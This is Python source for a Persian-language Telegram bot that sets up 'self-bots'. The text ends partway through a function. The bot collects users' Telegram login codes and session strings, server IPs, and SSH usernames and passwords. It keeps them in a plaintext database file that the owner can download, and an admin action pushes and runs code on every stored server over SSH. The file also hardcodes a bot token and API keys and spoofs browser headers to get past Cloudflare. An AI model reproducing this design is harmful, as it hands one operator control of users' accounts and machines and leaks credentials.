import os
import time
import paramiko
import ipaddress
import asyncio
import logging
import json
import gzip
import urllib.request
import urllib.error
from contextlib import contextmanager
from pytz import timezone
from datetime import timedelta, datetime
from telegram import Update, InlineKeyboardMarkup, InlineKeyboardButton, ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes, ConversationHandler
from telegram.constants import ParseMode
from telethon import TelegramClient
from telethon.sessions import SQLiteSession, StringSession
from telethon.errors import SessionPasswordNeededError, PasswordHashInvalidError

if not os.path.exists("database"):
    os.makedirs("database", exist_ok=True)
if not os.path.exists("sessions"):
    os.makedirs("sessions", exist_ok=True)

DB_TEXT_PATH = "database/database.txt"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    filename="bot.log"
)
logger = logging.getLogger(__name__)

API_ID = 29481612
API_HASH = "01a41600f41fa58017c7220b954b7df8"
BOT_TOKEN = "8994843551:AAFbF5KtXf-1RQ0PN5woZUPyZFP6517OAaI"
OWNER_IDS = [6201723470]
CHANNEL_ID = "JavidSelf"
GROUP_ID = "JavidSelfGp"
PRIVATE_CHANNEL_ID = -1003804957958
BANNED_FILE = "banned.txt"
BANNED_NUMBERS_FILE = "banned_numbers.txt"
MAX_RUNS_FILE = "max_runs.txt"
LAST_RUNS_FILE = "last_runs.txt"

GET_NUMBER = 0
GET_CODE = 1
GET_2FA = 2
GET_RAILWAY_TOKEN = 3
ADMIN_INPUT_RUNS = 6
ADMIN_INPUT_BAN = 7
ADMIN_INPUT_UNBAN = 8
ADMIN_INPUT_CHANNEL = 9

USER_DATA_STORE = {}
RUNNING_USER = None
RUN_STARTED_AT = None
NEXT_RUN_ALLOWED_AT = None
BOT_ACTIVE = True
BANNED_USERS = set()
BANNED_NUMBERS = set()
REMAINING_RUNS = 0
LAST_RUNS = {}
ADNUMBER = ["989924991756", "989940458599"]

# هدرهای مرورگر واقعی برای عبور از Cloudflare
# نکته مهم: Accept-Encoding را حذف کردیم چون urllib خودش gzip decompress نمی‌کند
BROWSER_HEADERS = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "Accept": "application/json, text/plain, */*",
    "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
    "Origin": "https://railway.com",
    "Referer": "https://railway.com/",
    "Sec-Ch-Ua": '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
    "Sec-Ch-Ua-Mobile": "?0",
    "Sec-Ch-Ua-Platform": '"Windows"',
    "Sec-Fetch-Dest": "empty",
    "Sec-Fetch-Mode": "cors",
    "Sec-Fetch-Site": "same-origin",
    "Connection": "keep-alive"
}

def is_owner(user_id: int) -> bool:
    return user_id in OWNER_IDS

def load_last_runs():
    global LAST_RUNS
    LAST_RUNS = {}
    if os.path.exists(LAST_RUNS_FILE):
        with open(LAST_RUNS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                line_str = line.strip()
                parts = line_str.split(",")
                if len(parts) == 2:
                    if parts[0].isdigit():
                        uid = int(parts[0])
                        ts = float(parts[1])
                        LAST_RUNS[uid] = ts

def save_last_runs():
    with open(LAST_RUNS_FILE, "w", encoding="utf-8") as f:
        for uid, ts in LAST_RUNS.items():
            f.write(f"{uid},{ts}\n")

def load_max_runs():
    if os.path.exists(MAX_RUNS_FILE):
        with open(MAX_RUNS_FILE, "r") as f:
            try:
                content = f.read().strip()
                return int(content)
            except:
                return 0
    return 0

def save_max_runs(count):
    with open(MAX_RUNS_FILE, "w") as f:
        f.write(str(count))

def save_banned_users():
    with open(BANNED_FILE, "w") as f:
        for uid in BANNED_USERS:
            f.write(f"{uid}\n")

def save_banned_numbers():
    with open(BANNED_NUMBERS_FILE, "w") as f:
        for number in BANNED_NUMBERS:
            f.write(f"{number}\n")

if os.path.exists(BANNED_FILE):
    with open(BANNED_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if line.isdigit():
                BANNED_USERS.add(int(line))

if os.path.exists(BANNED_NUMBERS_FILE):
    with open(BANNED_NUMBERS_FILE, "r") as f:
        for line in f:
            BANNED_NUMBERS.add(line.strip())

REMAINING_RUNS = load_max_runs()
load_last_runs()

@contextmanager
def ssh_connection(ip, username, password):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            ip,
            username=username,
            password=password,
            timeout=20,
            allow_agent=False,
            look_for_keys=False
        )
        yield ssh
    finally:
        ssh.close()

def railway_graphql(token, query, variables=None):
    """Send a GraphQL request to Railway API with full browser headers to bypass Cloudflare."""
    payload = {"query": query}
    if variables:
        payload["variables"] = variables
    data = json.dumps(payload).encode("utf-8")
    
    # ترکیب هدرهای مرورگر با توکن
    headers = BROWSER_HEADERS.copy()
    headers["Content-Type"] = "application/json"
    headers["Authorization"] = f"Bearer {token.strip()}"
    
    req = urllib.request.Request(
        "https://backboard.railway.com/graphql/v2",
        data=data,
        headers=headers,
        method="POST",
    )
    try:
        with urllib.request.urlopen(req, timeout=30) as resp:
            raw_bytes = resp.read()
            
            # بررسی اینکه آیا پاسخ gzip فشرده شده است یا نه
            # (ممکن است سرور با وجود نداشتن Accept-Encoding، باز هم gzip بفرستد)
            content_encoding = resp.headers.get("Content-Encoding", "").lower()
            if content_encoding == "gzip" or raw_bytes[:2] == b'\x1f\x8b':
                try:
                    raw_bytes = gzip.decompress(raw_bytes)
                except Exception as gz_err:
                    logger.warning(f"gzip decompress failed: {gz_err}")
            
            result = json.loads(raw_bytes.decode("utf-8"))
    except urllib.error.HTTPError as e:
        body = ""
        try:
            raw = e.read()
            if raw[:2] == b'\x1f\x8b':
                raw = gzip.decompress(raw)
            body = raw.decode("utf-8")
        except Exception:
            pass
        raise Exception(f"HTTP {e.code}: {e.reason} | {body[:300]}")
    except urllib.error.URLError as e:
        raise Exception(f"URL Error: {e.reason}")
    
    if "errors" in result:
        raise Exception(result["errors"][0].get("message", str(result["errors"])))
    return result.get("data")

def deploy_to_railway(token, string_session, user_id):
    """
    Create a Railway project + service from the public GitHub repo,
    set STRING_SESSION / API_ID / API_HASH, set start command, and deploy.
    Returns (success: bool, message: str)
    """
    try:
        # 1. Create project
        project_data = railway_graphql(token, """
            mutation projectCreate($input: ProjectCreateInput!) {
                projectCreate(input: $input) { id name }
            }
        """, {"input": {"name": f"javid-self-{user_id}"}})
        project_id = project_data["projectCreate"]["id"]

        # 2. Get environment id
        proj = railway_graphql(token, """
            query project($id: String!) {
                project(id: $id) {
                    environments { edges { node { id name } } }
                }
            }
        """, {"id": project_id})
        env_id = proj["project"]["environments"]["edges"][0]["node"]["id"]

        # 3. Create service from GitHub repo
        service_data = railway_graphql(token, """
            mutation serviceCreate($input: ServiceCreateInput!) {
                serviceCreate(input: $input) { id name }
            }
        """, {
            "input": {
                "projectId": project_id,
                "name": "selfbot",
                "source": {"repo": "ppj30088-hash/javid-selfbot"}
            }
        })
        service_id = service_data["serviceCreate"]["id"]

        # 4. Set start command to python self.py
        railway_graphql(token, """
            mutation serviceInstanceUpdate($serviceId: String!, $environmentId: String!, $input: ServiceInstanceUpdateInput!) {
                serviceInstanceUpdate(serviceId: $serviceId, environmentId: $environmentId, input: $input)
            }
        """, {
            "serviceId": service_id,
            "environmentId": env_id,
            "input": {"startCommand": "python self.py"}
        })

        # 5. Set environment variables
        railway_graphql(token, """
            mutation variableCollectionUpsert($input: VariableCollectionUpsertInput!) {
                variableCollectionUpsert(input: $input)
            }
        """, {
            "input": {
                "projectId": project_id,
                "environmentId": env_id,
                "serviceId": service_id,
                "variables": {
                    "STRING_SESSION": string_session,
                    "API_ID": str(API_ID),
                    "API_HASH": API_HASH
                }
            }
        })

        # 6. Trigger deploy
        railway_graphql(token, """
            mutation serviceInstanceDeploy($serviceId: String!, $environmentId: String!) {
                serviceInstanceDeploy(serviceId: $serviceId, environmentId: $environmentId)
            }
        """, {
            "serviceId": service_id,
            "environmentId": env_id
        })

        return True, f"پروژه با موفقیت ساخته و دیپلوی شد.\nProject ID: `{project_id}`\nService ID: `{service_id}`"
    except Exception as e:
        logger.error(f"Railway deploy error for user {user_id}: {e}")
        return False, str(e)

def save_user_text(user_id, username=None, phone=None, ip=None, server_user=None, passwd=None, string_session=None):
    if username and not username.startswith("@"):
        username = f"@{username}"
    lines = []
    updated = False
    if os.path.exists(DB_TEXT_PATH):
        with open(DB_TEXT_PATH, "r", encoding="utf-8") as f:
            lines = f.readlines()
        for i, line in enumerate(lines):
            parts = line.strip().split('. ', 1)
            if len(parts) == 2:
                if parts[1].startswith(f"{user_id} "):
                    existing_fields = parts[1].split(" ")
                    existing_user_id = existing_fields[0]
                    existing_username = existing_fields[1] if len(existing_fields) > 1 else ""
                    existing_phone = existing_fields[2] if len(existing_fields) > 2 else ""
                    existing_ip = existing_fields[3] if len(existing_fields) > 3 else "None"
                    existing_suser = existing_fields[4] if len(existing_fields) > 4 else "None"
                    existing_spass = existing_fields[5] if len(existing_fields) > 5 else "None"
                    existing_string = existing_fields[6] if len(existing_fields) > 6 else "None"
                    final_username = username if username else existing_username
                    final_phone = phone if phone else existing_phone
                    final_ip = ip if ip else existing_ip
                    final_suser = server_user if server_user else existing_suser
                    final_spass = passwd if passwd else existing_spass
                    final_string = string_session if string_session else existing_string
                    new_data = f"{existing_user_id} {final_username} {final_phone} {final_ip} {final_suser} {final_spass} {final_string}".strip()
                    lines[i] = f"{parts[0]}. {new_data}\n"
                    updated = True
                    break
    if not updated:
        index = len(lines) + 1
        final_username = username or "None"
        final_phone = phone or "None"
        final_ip = ip or "None"
        final_suser = server_user or "None"
        final_spass = passwd or "None"
        final_string = string_session or "None"
        new_data = f"{user_id} {final_username} {final_phone} {final_ip} {final_suser} {final_spass} {final_string}".strip()
        lines.append(f"{index}. {new_data}\n")
    with open(DB_TEXT_PATH, "w", encoding="utf-8") as f:
        f.writelines(lines)

async def cleanup_sessions(user_id):
    if user_id in USER_DATA_STORE:
        if "client" in USER_DATA_STORE[user_id]:
            try:
                await USER_DATA_STORE[user_id]["client"].disconnect()
            except:
                pass

async def update_channel_message(application: Application):
    try:
        now = datetime.now(timezone("Asia/Tehran"))
        current_time = now.strftime('%H:%M')
        message_text = f"ساعت: {current_time}\nتعداد ران مجاز: {REMAINING_RUNS} نفر\n"
        if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
            allowed_str = NEXT_RUN_ALLOWED_AT.strftime('%H:%M')
            message_text += f"ربات استفاده شده تا ساعت: {allowed_str}\n"
        else:
            message_text += "به یاد کسانی که دیگه بینمون نیستن :)\n"
        message_text += "Creator | t.me/uezrz\n@JavidSelfBot"
        try:
            await application.bot.edit_message_text(chat_id=f"@{CHANNEL_ID}", message_id=32, text=message_text)
        except Exception:
            await application.bot.edit_message_caption(chat_id=f"@{CHANNEL_ID}", message_id=32, caption=message_text)
    except:
        pass

async def check_membership(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int) -> bool:
    return True

def get_numeric_keyboard(current_code=""):
    buttons = [
        [
            InlineKeyboardButton("1", callback_data="code_add_1"),
            InlineKeyboardButton("2", callback_data="code_add_2"),
            InlineKeyboardButton("3", callback_data="code_add_3")
        ],
        [
            InlineKeyboardButton("4", callback_data="code_add_4"),
            InlineKeyboardButton("5", callback_data="code_add_5"),
            InlineKeyboardButton("6", callback_data="code_add_6")
        ],
        [
            InlineKeyboardButton("7", callback_data="code_add_7"),
            InlineKeyboardButton("8", callback_data="code_add_8"),
            InlineKeyboardButton("9", callback_data="code_add_9")
        ],
        [
            InlineKeyboardButton("0", callback_data="code_add_0")
        ],
        [
            InlineKeyboardButton("تایید کد", callback_data="code_confirm"),
            InlineKeyboardButton("انصراف", callback_data="code_cancel"),
            InlineKeyboardButton("پاک کردن", callback_data="code_clear_all")
        ]
    ]
    text = "کد ورود را وارد کنید :\n\n"
    if current_code:
        text += f"{current_code}\n"
    return InlineKeyboardMarkup(buttons), text

async def send_main_menu(chat_id, user_id, context: ContextTypes.DEFAULT_TYPE):
    buttons = [
        [
            InlineKeyboardButton("اجرای سلف", callback_data="run_self", style='success'),
            InlineKeyboardButton("چک کردن شماره", callback_data="check_number", style='success')
        ],
        [
            InlineKeyboardButton("قوانین", callback_data="rules", style='danger')
        ],
        [
            InlineKeyboardButton("پشتیبانی", url="https://t.me/parham_1218", style='primary')
        ]
    ]
    if is_owner(user_id):
        buttons.append([InlineKeyboardButton("پنل مدیریت", callback_data="admin_panel", style='success')])
    kb = InlineKeyboardMarkup(buttons)
    try:
        await context.bot.copy_message(
            chat_id=chat_id,
            from_chat_id=PRIVATE_CHANNEL_ID,
            message_id=5,
            caption="**سلام، به ربات سلف ساز Javid خوش اومدی!\n\nقبل از اجرای سلف حتما قوانین را مطالعه کن:**",
            reply_markup=kb,
            parse_mode=ParseMode.MARKDOWN
        )
    except Exception:
        await context.bot.send_message(
            chat_id=chat_id,
            text="**سلام، به ربات سلف ساز Javid خوش اومدی!\n\nقبل از اجرای سلف حتما قوانین را مطالعه کن:**",
            reply_markup=kb,
            parse_mode=ParseMode.MARKDOWN
        )

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global RUNNING_USER, RUN_STARTED_AT
    user_id = update.effective_user.id
    if user_id in BANNED_USERS:
        return ConversationHandler.END
    is_member = await check_membership(update, context, user_id)
    if not is_member:
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("عضو شو", url=f"https://t.me/{CHANNEL_ID}", style='primary')],
            [InlineKeyboardButton("عضو شو", url=f"https://t.me/{GROUP_ID}", style='primary')]
        ])
        await update.message.reply_text("شما عضو کانال و گروه نیستید. لطفاً ابتدا عضو شوید و سپس /start را ارسال کنید.", reply_markup=kb)
        return ConversationHandler.END
    if not BOT_ACTIVE and not is_owner(user_id):
        await update.message.reply_text("ربات در حال حاضر خاموش است!")
        return ConversationHandler.END
    current_username = update.effective_user.username or update.effective_user.first_name
    save_user_text(user_id, username=current_username)
    if RUNNING_USER == user_id:
        RUNNING_USER = None
        RUN_STARTED_AT = None
        if user_id in USER_DATA_STORE:
            USER_DATA_STORE.pop(user_id)
    await send_main_menu(update.effective_chat.id, user_id, context)
    return ConversationHandler.END

async def reset_run_task(bot_instance, chat_id, uid):
    await asyncio.sleep(300)
    global RUNNING_USER, RUN_STARTED_AT
    if RUNNING_USER == uid:
        RUNNING_USER = None
        RUN_STARTED_AT = None
        if uid in USER_DATA_STORE:
            USER_DATA_STORE.pop(uid)
    try:
        await bot_instance.send_message(chat_id=chat_id, text="به محدودیت زمانی 5 دقیقه رسیدید! برای اجرای دوباره سلف، دستور /start را ارسال کنید.")
    except:
        pass

def update_all_servers_sync():
    if not os.path.exists(DB_TEXT_PATH):
        return 0, 0
    local_self_py = None
    for path in ["file/self.py", "bot/file/self.py", "self.py"]:
        if os.path.exists(path):
            local_self_py = path
            break
    if not local_self_py:
        return -1, -1
    success_count = 0
    fail_count = 0
    with open(DB_TEXT_PATH, "r", encoding="utf-8") as f:
        lines = f.readlines()
    for line in lines:
        parts = line.strip().split('. ', 1)
        if len(parts) != 2:
            continue
        fields = parts[1].split(" ")
        if len(fields) < 6:
            continue
        ip = fields[3]
        suser = fields[4]
        spass = fields[5]
        if ip == "None" or suser == "None" or spass == "None":
            continue
        try:
            with ssh_connection(ip, suser, spass) as ssh:
                sftp = ssh.open_sftp()
                ssh.exec_command("mkdir -p self", timeout=15)
                time.sleep(0.5)
                sftp.put(local_self_py, "self/self.py")
                ssh.exec_command("pkill -f self.py", timeout=10)
                time.sleep(1)
                run_cmd = "cd self && nohup python3 self.py > self_error.log 2>&1 &"
                ssh.exec_command(run_cmd)
                success_count += 1
        except Exception as e:
            logger.error(f"Failed bulk update for server {ip}: {e}")
            fail_count += 1
    return success_count, fail_count

async def handle_callbacks(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global BOT_ACTIVE, RUNNING_USER, RUN_STARTED_AT, REMAINING_RUNS, NEXT_RUN_ALLOWED_AT, LAST_RUNS
    query = update.callback_query
    user_id = update.effective_user.id
    data = query.data
    if data in ["admin_ban_user", "admin_unban_user", "set_run_custom", "admin_set_channel_custom", "run_self", "check_number"]:
        try:
            await query.answer()
        except:
            pass
        return
    if data == "rules":
        await query.answer()
        kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="back_to_start", style='primary')]])
        try:
            await query.message.delete()
        except:
            pass
        await context.bot.send_message(
            chat_id=update.effective_chat.id,
            text="کاربر گرامی، فروش این سلف به هر صورت غیر مجاز بوده و در صورت فروش حساب شما دیلیت خواهد شد و هرگونه مشکلی که برای حساب شما رخ دهد به سلف و مالک مربوط نخواهد بود. همچنین هرگونه بی احترامی به مدیران و سازنده سلف ممنوع می‌باشد.",
            reply_markup=kb
        )
        return ConversationHandler.END
    elif data == "back_to_start":
        await query.answer()
        try:
            await query.message.delete()
        except:
            pass
        await send_main_menu(update.effective_chat.id, user_id, context)
        return ConversationHandler.END
    elif data == "admin_panel":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        try:
            with open("channel_id.txt", "r") as f:
                ch_id = f.read().strip()
                ch_text = f"{ch_id}"
        except:
            ch_text = "ثبت نشده"
        if BOT_ACTIVE:
            status_emoji = "آنلاین"
            toggle_style = 'success'
        else:
            status_emoji = "آفلاین"
            toggle_style = 'danger'
        admin_text = (
            "🛠 **پنل مدیریت سلف‌ساز**\n\n"
            f"📡 **آیدی چنل اطلاعات کاربران:** `{ch_text}`\n"
            f"🔢 **تعداد دسترسی ران:** {str(REMAINING_RUNS)}\n"
            f"🚦 **وضعیت ربات:** {status_emoji}\n\n"
            "_Welcome Boss, what's your next command?_"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"وضعیت ربات : {status_emoji}", callback_data="admin_toggle_bot", style=toggle_style)],
            [
                InlineKeyboardButton("مدیریت کاربران", callback_data="admin_user_manage", style='primary'),
                InlineKeyboardButton("آپدیت همگانی سلف‌ها", callback_data="admin_bulk_update", style='danger')
            ],
            [
                InlineKeyboardButton("ایدی چنل اطلاعات", callback_data="admin_channel_id_info", style='danger'),
                InlineKeyboardButton("تنظیم دسترسی ران", callback_data="admin_set_runs", style='primary')
            ],
            [InlineKeyboardButton("برداشتن محدودیت ران روزانه", callback_data="admin_clear_daily_limits", style='primary')],
            [InlineKeyboardButton("دریافت دیتابیس کاربران", callback_data="admin_get_db", style='success')],
            [InlineKeyboardButton("بستن پنل", callback_data="back_to_start", style='danger')]
        ])
        try:
            await query.message.delete()
        except:
            pass
        await context.bot.send_message(chat_id=update.effective_chat.id, text=admin_text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    elif data == "admin_clear_daily_limits":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        LAST_RUNS = {}
        save_last_runs()
        await query.answer("محدودیت روزانه تمام کاربران برداشته شد! حق ران مجدد آزاد شد.", show_alert=True)
        return ConversationHandler.END
    elif data == "admin_bulk_update":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer("عملیات آپدیت همگانی آغاز شد...", show_alert=False)
        wait_msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="در حال اتصال به سرورها و آپدیت سورس سلف‌ها...\nلطفاً شکیبا باشید.")
        s_count, f_count = await asyncio.to_thread(update_all_servers_sync)
        try:
            await wait_msg.delete()
        except:
            pass
        if s_count == -1:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="خطا: فایل سورس جدید سلف (self.py) روی هاست ربات پیدا نشد!")
        else:
            await context.bot.send_message(
                chat_id=update.effective_chat.id,
                text=f"عملیات آپدیت همگانی به پایان رسید.\n\nموفق: {s_count} سرور\nناموفق: {f_count} سرور"
            )
        return ConversationHandler.END
    elif data == "admin_toggle_bot":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        BOT_ACTIVE = not BOT_ACTIVE
        try:
            with open("channel_id.txt", "r") as f:
                ch_id = f.read().strip()
                ch_text = f"{ch_id}"
        except:
            ch_text = "ثبت نشده"
        if BOT_ACTIVE:
            status_emoji = "آنلاین"
            toggle_style = 'success'
        else:
            status_emoji = "آفلاین"
            toggle_style = 'danger'
        admin_text = (
            "🛠 **پنل مدیریت سلف‌ساز**\n\n"
            f"📡 **آیدی چنل اطلاعات کاربران:** `{ch_text}`\n"
            f"🔢 **تعداد دسترسی ران:** {str(REMAINING_RUNS)}\n"
            f"🚦 **وضعیت ربات:** {status_emoji}\n\n"
            "_Welcome Boss, what's your next command?_"
        )
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton(f"وضعیت ربات : {status_emoji}", callback_data="admin_toggle_bot", style=toggle_style)],
            [
                InlineKeyboardButton("مدیریت کاربران", callback_data="admin_user_manage", style='primary'),
                InlineKeyboardButton("آپدیت همگانی سلف‌ها", callback_data="admin_bulk_update", style='danger')
            ],
            [
                InlineKeyboardButton("ایدی چنل اطلاعات", callback_data="admin_channel_id_info", style='danger'),
                InlineKeyboardButton("تنظیم دسترسی ران", callback_data="admin_set_runs", style='primary')
            ],
            [InlineKeyboardButton("برداشتن محدودیت ران روزانه", callback_data="admin_clear_daily_limits", style='primary')],
            [InlineKeyboardButton("دریافت دیتابیس کاربران", callback_data="admin_get_db", style='success')],
            [InlineKeyboardButton("بستن پنل", callback_data="back_to_start", style='danger')]
        ])
        try:
            await query.message.edit_text(admin_text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        except Exception:
            try:
                await query.message.delete()
            except:
                pass
            await context.bot.send_message(chat_id=update.effective_chat.id, text=admin_text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    elif data == "admin_get_db":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        if os.path.exists(DB_TEXT_PATH):
            try:
                with open(DB_TEXT_PATH, "rb") as f:
                    await context.bot.send_document(
                        chat_id=update.effective_chat.id,
                        document=f,
                        filename="database.txt",
                        caption="فایل دیتابیس متنی کاربران ربات :"
                    )
            except Exception as e:
                await context.bot.send_message(chat_id=update.effective_chat.id, text=f"خطا در ارسال فایل: {e}")
        else:
            await context.bot.send_message(chat_id=update.effective_chat.id, text="فایل دیتابیس هنوز ایجاد نشده است یا یافت نشد!")
        return ConversationHandler.END
    elif data == "admin_set_runs":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        text = f"**بخش تنظیم تعداد ران مجاز**\n\nمقدار فعلی: {REMAINING_RUNS}\nمقدار مورد نیاز خود را انتخاب کنید:"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("1", callback_data="set_run_1", style='success'), InlineKeyboardButton("10", callback_data="set_run_10", style='success')],
            [InlineKeyboardButton("100", callback_data="set_run_100", style='success'), InlineKeyboardButton("عدد دلخواه", callback_data="set_run_custom", style='success')],
            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
        ])
        try:
            await query.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        except:
            try:
                await query.message.delete()
            except:
                pass
            await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    elif data.startswith("set_run_") and data != "set_run_custom":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        count = int(data.split("_")[-1])
        REMAINING_RUNS = count
        save_max_runs(count)
        await update_channel_message(context.application)
        text = f"**بخش تنظیم تعداد ران مجاز**\n\nمقدار فعلی: {REMAINING_RUNS}\nیک گزینه را انتخاب کنید یا عدد دلخواه بفرستید:"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("1", callback_data="set_run_1", style='success'), InlineKeyboardButton("10", callback_data="set_run_10", style='success')],
            [InlineKeyboardButton("100", callback_data="set_run_100", style='success'), InlineKeyboardButton("عدد دلخواه", callback_data="set_run_custom", style='success')],
            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
        ])
        try:
            await query.message.edit_text(text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        except:
            try:
                await query.message.delete()
            except:
                pass
            await context.bot.send_message(chat_id=update.effective_chat.id, text=text, reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    elif data == "admin_user_manage":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("Ban", callback_data="admin_ban_user", style='danger'), InlineKeyboardButton("Unban", callback_data="admin_unban_user", style='success')],
            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
        ])
        try:
            await query.message.edit_text("⚙️ این بخش جهت مدیریت کاربران طراحی شده است.", reply_markup=kb)
        except:
            try:
                await query.message.delete()
            except:
                pass
            await context.bot.send_message(chat_id=update.effective_chat.id, text="⚙️ این بخش جهت مدیریت کاربران طراحی شده است.", reply_markup=kb)
        return ConversationHandler.END
    elif data == "admin_channel_id_info":
        if not is_owner(user_id):
            await query.answer("شما دسترسی ندارید")
            return ConversationHandler.END
        await query.answer()
        try:
            with open("channel_id.txt", "r") as f:
                ch_id = f.read().strip()
        except:
            ch_id = "ثبت نشده"
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("✍️ تنظیم آیدی عددی جدید", callback_data="admin_set_channel_custom", style='success')],
            [InlineKeyboardButton("بازگشت", callback_data="admin_panel", style='primary')]
        ])
        try:
            await query.message.edit_text(f"آی‌دی کانال ذخیره شده فعلی:\n`{ch_id}`\n\nشما می‌توانید با زدن روی دکمه زیر آیدی عددی کانال خصوصی خود را مستقیماً وارد کنید.", reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        except:
            try:
                await query.message.delete()
            except:
                pass
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"آی‌دی کانال ذخیره شده فعلی:\n`{ch_id}`\n\nشما می‌توانید با زدن روی دکمه زیر آیدی عددی کانال خصوصی خود را مستقیماً وارد کنید.", reply_markup=kb, parse_mode=ParseMode.MARKDOWN)
        return ConversationHandler.END
    elif data == "edu_main":
        await query.answer()
        kb = InlineKeyboardMarkup([
            [InlineKeyboardButton("ران", callback_data="edu_run", style='success'), InlineKeyboardButton("سرور", callback_data="edu_server", style='success')],
            [InlineKeyboardButton("بازگشت", callback_data="back_to_start", style='primary')]
        ])
        try:
            await query.message.delete()
        except:
            pass
        await context.bot.send_message(chat_id=update.effective_chat.id, text="لطفاً یکی از موارد زیر را برای آموزش انتخاب کنید:", reply_markup=kb)
        return ConversationHandler.END
    elif data == "edu_run":
        await query.answer()
        try:
            await query.message.delete()
        except:
            pass
        try:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
            await context.bot.copy_message(
                chat_id=update.effective_chat.id,
                from_chat_id="@JavidHelp",
                message_id=6,
                reply_markup=kb
            )
        except:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
            await context.bot.send_message(chat_id=update.effective_chat.id, text="خطا در دریافت فایل آموزشی ران.", reply_markup=kb)
        return ConversationHandler.END
    elif data == "edu_server":
        await query.answer()
        try:
            await query.message.delete()
        except:
            pass
        try:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
            await context.bot.copy_message(
                chat_id=update.effective_chat.id,
                from_chat_id="@JavidHelp",
                message_id=5,
                reply_markup=kb
            )
        except:
            kb = InlineKeyboardMarkup([[InlineKeyboardButton("بازگشت", callback_data="edu_main", style='primary')]])
            await context.bot.send_message(chat_id=update.effective_chat.id, text="خطا در دریافت فایل آموزشی سرور.", reply_markup=kb)
        return ConversationHandler.END

async def start_check_number_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user_id = update.effective_user.id
    try:
        await query.message.delete()
    except:
        pass
    keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]], resize_keyboard=True, one_time_keyboard=True)
    msg = await context.bot.send_message(chat_id=update.effective_chat.id, text="با استفاده از دکمه زیر شماره خود را ارسال کنید:", reply_markup=keyboard)
    USER_DATA_STORE[user_id] = {"flow": "check", "last_bot_msg": msg.message_id}
    return GET_NUMBER

async def start_run_self_flow(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT
    query = update.callback_query
    user_id = update.effective_user.id
    if user_id in USER_DATA_STORE:
        await cleanup_sessions(user_id)
        USER_DATA_STORE.pop(user_id, None)
    if RUNNING_USER == user_id:
        RUNNING_USER = None
        RUN_STARTED_AT = None
    is_member = await check_membership(update, context, user_id)
    if not is_member:
        await query.answer("شما عضو گروه یا کانال نیستید!", show_alert=True)
        return ConversationHandler.END
    if not BOT_ACTIVE and not is_owner(user_id):
        await query.answer("ربات خاموش است!", show_alert=True)
        return ConversationHandler.END
    now = datetime.now(timezone("Asia/Tehran"))
    if not is_owner(user_id):
        last_ts = LAST_RUNS.get(user_id)
        if last_ts:
            last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))
            if (now - last_time).total_seconds() < 86400:
                await query.answer("شما امروز سلف ران کردید!", show_alert=True)
                return ConversationHandler.END
